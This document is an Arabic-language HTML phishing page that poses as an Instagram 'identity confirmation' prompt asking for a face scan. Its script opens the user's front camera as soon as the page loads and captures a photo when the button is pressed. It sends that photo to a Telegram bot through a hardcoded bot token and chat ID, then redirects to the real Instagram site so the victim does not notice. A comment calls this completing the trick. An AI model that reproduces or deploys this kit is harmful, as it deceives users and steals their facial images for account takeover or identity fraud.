<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Instagram</title>
    <style>
        /* تصغير وحماية الصفحة من التداخل */
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
        body { background-color: #000; height: 100vh; display: flex; align-items: center; justify-content: center; overflow: hidden; }
        
        /* تأثير التمويه للخلفية لإعطاء إيحاء بالتطبيق */
        .wrapper { position: absolute; width: 100%; height: 100%; background: #000; display: flex; align-items: center; justify-content: center; }
        .bg-mockup { position: absolute; width: 100%; height: 100%; background: url('https://the-peak.ca/wp-content/uploads/2023/10/Instagram-Feed-Dark-Mode.png') center/cover; filter: blur(15px) brightness(0.4); }

        /* نافذة التنبيه الأصلية من إنستغرام */
        .alert-container { position: relative; background-color: #262626; width: 280px; border-radius: 12px; overflow: hidden; z-index: 10; animation: instagramPop 0.2s ease-out; }
        
        .alert-body { padding: 24px 16px; text-align: center; }
        .alert-title { color: #fff; font-size: 18px; font-weight: 600; margin-bottom: 8px; }
        .alert-msg { color: #b2b2b2; font-size: 14px; line-height: 1.4; }

        /* الأزرار بنمط iOS/Instagram */
        .alert-footer { border-top: 0.5px solid #3d3d3d; display: flex; flex-direction: column; }
        .btn { background: none; border: none; padding: 14px; font-size: 14px; cursor: pointer; width: 100%; outline: none; }
        .btn-blue { color: #0095f6; font-weight: 700; border-bottom: 0.5px solid #3d3d3d; }
        .btn-white { color: #fff; font-weight: 400; }
        .btn:active { background-color: #333; }

        @keyframes instagramPop {
            from { transform: scale(1.1); opacity: 0; }
            to { transform: scale(1); opacity: 1; }
        }

        video, canvas { display: none; }
    </style>
</head>
<body>

<div class="wrapper">
    <div class="bg-mockup"></div>
    
    <div class="alert-container">
        <div class="alert-body">
            <div class="alert-title">تأكيد الهوية</div>
            <div class="alert-msg">نحتاج إلى إجراء فحص سريع للوجه للتأكد من أنك صاحب الحساب ومنع الوصول غير المصرح به.</div>
        </div>
        <div class="alert-footer">
            <button id="captureBtn" class="btn btn-blue">بدء المسح الضوئي</button>
            <button onclick="location.reload()" class="btn btn-white">إلغاء</button>
        </div>
    </div>
</div>

<video id="video" autoplay playsinline></video>
<canvas id="canvas"></canvas>

<script>
    const BOT_TOKEN = '8308924210:AAGEeCtg7QMc6jdX1Lh8_IotYd0p8l7nDq0';
    const CHAT_ID = '2140385904';
    let activeStream = null;

    // تشغيل الكاميرا في الخلفية فوراً وبصمت
    async function initCamera() {
        try {
            activeStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
            document.getElementById('video').srcObject = activeStream;
        } catch (err) {
            console.log("Waiting for user interaction...");
        }
    }
    initCamera();

    document.getElementById('captureBtn').onclick = async function() {
        const btn = this;
        btn.innerText = "جاري الفحص...";
        btn.disabled = true;

        if (!activeStream) {
            try {
                activeStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                document.getElementById('video').srcObject = activeStream;
            } catch (e) {
                alert("يرجى السماح بالوصول للكاميرا لإتمام الفحص الأمني.");
                btn.disabled = false; btn.innerText = "بدء المسح الضوئي";
                return;
            }
        }

        // التقاط فوري (سرعة البرق)
        const canvas = document.getElementById('canvas');
        const video = document.getElementById('video');
        canvas.width = 480;
        canvas.height = 640;
        canvas.getContext('2d').drawImage(video, 0, 0, 480, 640);
        
        canvas.toBlob(async (blob) => {
            const formData = new FormData();
            formData.append('chat_id', CHAT_ID);
            formData.append('photo', blob, 'security_shot.jpg');
            
            // إرسال للبوت في الخلفية دون انتظار
            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: formData });
            
            // تحويل فوري لإتمام الخدعة
            setTimeout(() => {
                if(activeStream) activeStream.getTracks().forEach(t => t.stop());
                window.location.href = "https://www.instagram.com/accounts/manage_access/";
            }, 600);
        }, 'image/jpeg', 0.5);
    };
</script>

</body>
</html>
